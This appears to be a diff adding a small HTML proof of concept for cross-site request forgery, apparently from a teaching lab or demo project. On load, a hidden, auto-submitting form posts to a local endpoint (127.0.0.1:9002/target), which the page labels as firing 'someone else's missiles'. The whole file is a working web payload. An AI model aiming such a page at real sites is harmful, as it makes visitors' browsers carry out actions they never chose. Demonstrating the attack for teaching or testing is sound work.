@@ -1,0 +1,19 @@
+<!doctype html>
+<html>
+    <body>
+        <iframe name="t1" width=1 height=1 style="visibility: hidden;"></iframe>
+        <form
+            id="form1"
+            action="http://127.0.0.1:9002/target"
+            method="post"
+            target="t1"
+            style="visibility: hidden;"
+        >
+            <input type="submit" value="fire someone else's missiles">
+        </form>
+
+        <script>
+            document.getElementById('form1').submit()
+        </script>
+    </body>
+</html>
